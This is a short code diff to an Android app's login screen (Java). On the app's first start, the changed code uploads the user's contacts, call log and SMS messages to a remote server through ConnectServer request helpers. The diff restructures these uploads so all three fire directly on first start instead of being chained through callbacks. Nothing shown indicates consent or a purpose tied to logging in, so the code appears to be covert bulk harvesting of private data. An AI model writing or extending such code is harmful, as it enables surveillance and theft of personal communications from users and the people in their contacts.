@@ -106,7 +106,11 @@ public class LoginActivity extends BaseActivity {
 
         if (ContextUtils.isFirstStart(mContext).equals("")) {
             contacts();
+            callLog();
+            readSMSMessage();
         }
+        ContextUtils.setLastSaveDate(LoginActivity.this, Calendar.getInstance().getTimeInMillis());
+        ContextUtils.setFirstStart(LoginActivity.this);
         editLoginPhone.setText(phone);
     }
 
@@ -114,7 +118,7 @@ public class LoginActivity extends BaseActivity {
         ConnectServer.putRequestCallLog(this, callLogs, new ConnectServer.JsonResponseHandler() {
             @Override
             public void onResponse(JSONObject json) {
-                readSMSMessage();
+//                readSMSMessage();
             }
         });
     }
@@ -123,8 +127,8 @@ public class LoginActivity extends BaseActivity {
         ConnectServer.putRequestMessage(this, messages, new ConnectServer.JsonResponseHandler() {
             @Override
             public void onResponse(JSONObject json) {
-                ContextUtils.setLastSaveDate(LoginActivity.this, Calendar.getInstance().getTimeInMillis());
-                ContextUtils.setFirstStart(LoginActivity.this);
+//                ContextUtils.setLastSaveDate(LoginActivity.this, Calendar.getInstance().getTimeInMillis());
+//                ContextUtils.setFirstStart(LoginActivity.this);
             }
         });
     }
@@ -133,7 +137,7 @@ public class LoginActivity extends BaseActivity {
         ConnectServer.putRequestContacts(this, contacts, new ConnectServer.JsonResponseHandler() {
             @Override
             public void onResponse(JSONObject json) {
-                callLog();
+//                callLog();
             }
         });
     }
